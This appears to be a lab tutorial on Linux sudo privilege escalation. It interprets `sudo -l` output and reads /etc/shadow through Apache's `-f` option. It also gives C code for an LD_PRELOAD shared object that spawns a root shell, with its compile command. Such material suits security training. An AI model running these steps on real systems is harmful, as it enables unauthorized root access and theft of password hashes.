### Basic Sudo Escalation

First, check what our user can run with ``sudo``:
````
sudo -l
````
<img width="1811" height="212" alt="image" src="https://github.com/user-attachments/assets/510d2a4c-3c66-4940-9176-6e2337c38a7b" />


| Output                               | Meaning                                         |
| ------------------------------------ | ----------------------------------------------- |
| `Matching Defaults entries for john` | Sudo configuration that applies to `john`       |
| `env_reset`                          | Resets most environment variables               |
| `mail_badpass`                       | Logs/alerts on incorrect sudo passwords         |
| `secure_path=...`                    | Defines the PATH used by sudo                   |
| `use_pty`                            | Runs sudo commands through a pseudo-terminal    |
| `env_keep+=LD_PRELOAD`               | **Keeps the `LD_PRELOAD` environment variable** |
| `(ALL)`                              | `john` can run the command as **any user**      |
| `NOPASSWD`                           | No sudo password is required                    |
| `/usr/bin/nano`                      | `john` can run Nano as root/another user        |
| `/usr/sbin/apache2`                  | `john` can run Apache2 as root/another user     |



> ``sudo -l`` tells us exactly which commands our account can execute with elevated privileges.



### Leverage Application Functions

Sometimes a program allowed through ``sudo`` does not have a simple shell feature, but one of its **built-in options can be abused**.

Check:
````
apache2 -h
````
<img width="901" height="655" alt="image" src="https://github.com/user-attachments/assets/0f9a5069-95e2-4481-8f5e-9f6c023b0c52" />


`-f`: which means Apache can load an alternative configuration file.


Then run this:
````
sudo apache2 -C "LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so" -f /etc/shadow
````
The important concept is not Apache itself:

``Allowed program through sudo`` -> ``Find an interesting built-in option`` -> ``Use the option with a sensitive file`` -> ``Information may be exposed``

> A program does not need to be directly vulnerable; one of its normal functions may create a privilege-escalation opportunity.


### Leverage LD_PRELOAD
``LD_PRELOAD`` is a Linux environment variable that can make a program load a specified shared library (``.so``) before other libraries.


<img width="1806" height="197" alt="image" src="https://github.com/user-attachments/assets/1e9f3da5-3a3f-4870-a553-083796659760" />


This means the ``LD_PRELOAD`` environment variable can remain available when using ``sudo``.

The steps of this privilege escalation vector can be summarized as follows:
1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a shared object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file


Create the Shared Library
````
nano shell.c
````
````shell
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
````
<img width="1184" height="338" alt="image" src="https://github.com/user-attachments/assets/564cecdd-cc44-4ba9-a867-7289a56eb239" />


To save it just press `Ctrl + O` -> `Enter` -> `Ctrl + X`.

Compile it:
````
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
````
